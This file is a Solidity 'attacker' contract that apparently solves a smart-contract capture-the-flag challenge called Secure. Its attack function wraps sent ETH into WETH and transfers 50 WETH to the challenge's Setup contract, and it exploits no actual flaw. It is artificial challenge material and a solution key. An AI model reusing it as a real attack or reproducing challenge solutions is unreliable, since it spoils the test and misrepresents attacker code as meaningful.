pragma solidity 0.5.12;

import "./Setup.sol";
import "hardhat/console.sol";

contract SecureAttackerIballes{

    WETH9 public constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Setup private setup;
    Wallet private wallet;

    constructor(Setup _setup) public{
        setup = _setup;
        wallet = _setup.wallet();
    }

    function attack() external payable{
        address(WETH).call.value(msg.value)("deposit()");
        WETH.approve(address(setup), 50 ether);
        WETH.transfer(address(setup), 50 ether);
    }
}